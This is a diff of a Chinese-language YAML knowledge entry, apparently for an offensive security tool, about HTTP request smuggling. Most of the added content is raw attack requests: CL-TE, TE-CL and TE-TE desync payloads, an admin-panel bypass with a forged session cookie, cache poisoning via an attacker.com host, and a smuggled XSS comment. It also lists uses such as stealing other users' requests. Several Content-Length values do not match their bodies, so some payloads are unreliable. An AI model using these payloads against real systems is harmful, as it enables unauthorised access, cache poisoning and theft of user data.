@@ -1,128 +1,121 @@
-name: smuggling
-description: smuggling 攻击技术和利用方法
+name: HTTP请求走私
+description: HTTP请求走私攻击 - CL-CL、CL-TE、TE-CL、TE-TE攻击链
 domain: web
-version: '1.0'
+version: '3.0'
 tags:
 - web
 - smuggling
-knowledge: '# HTTP请求走私
 
+knowledge: |
+  # HTTP请求走私
 
-  ## 1. CL-CL (Content-Length)
-
-
+  ## CL-CL (Content-Length差异)
   ```
-
   POST / HTTP/1.1
-
   Host: target.com
-
   Content-Length: 44
 
-
   GET /admin HTTP/1.1
-
   Host: target.com
 
 
-
   ```
 
-
-  ## 2. CL-TE (Content-Length + Transfer-Encoding)
-
-
+  ## CL-TE (Content-Length vs Transfer-Encoding)
   ```
-
   POST / HTTP/1.1
-
   Host: target.com
-
   Content-Length: 6
-
   Transfer-Encoding: chunked
-
 
   0
 
-
   G
-
   ```
 
-
-  ## 3. TE-CL (Transfer-Encoding + Content-Length)
-
-
+  ## TE-CL
   ```
-
   POST / HTTP/1.1
-
   Host: target.com
-
   Transfer-Encoding: chunked
-
   Content-Length: 4
 
-
   1
-
   A
-
   0
 
 
-
   ```
 
-
-  ## 4. TE-TE (Transfer-Encoding + Transfer-Encoding)
-
-
+  ## TE-TE
   ```
-
   POST / HTTP/1.1
-
   Host: target.com
-
   Transfer-Encoding: chunked
-
-  Transfer-Encoding: something
-
+  Transfer-Encoding: x
 
   0
-
 
   G
-
   ```
 
-
-  ## 攻击示例
-
-
-  ### 绕过前端安全
-
-
+  ## 绕过前端安全
   ```
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 60
 
   GET /admin HTTP/1.1
-
   Host: target.com
-
-
-  通过走私的请求访问/admin
-
-  ```
-
-
-  ### 缓存投毒
+  Cookie: session=admin
 
 
   ```
 
-  CL-TE走私，污染缓存
+  ## 缓存投毒
+  ```
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 80
+  Transfer-Encoding: chunked
+
+  0
+
+  GET /static.js HTTP/1.1
+  Host: attacker.com
+  X-Inject: alert(1)
+
 
   ```
 
-  '
+  ## 组合XSS
+  ```
+  POST / HTTP/1.1
+  Host: target.com
+  Content-Length: 100
+
+  POST /comment HTTP/1.1
+  Host: target.com
+  Content-Length: 50
+
+  content=<script>alert(1)</script>
+  ```
+
+  ## 检测方法
+  ```bash
+  # 使用Burp Suite
+  # 1. HTTP Request Smuggler插件
+  # 2. 手动发送不同Content-Length/TE的请求
+
+  # 时间差异检测
+  # 发送CL-TE请求，观察响应时间
+  ```
+
+  ## 常见利用场景
+  ```
+  1. 绕过前端认证
+  2. 缓存投毒
+  3. 触发XSS
+  4. 窃取其他用户请求
+  5. 内网端口扫描
+  ```
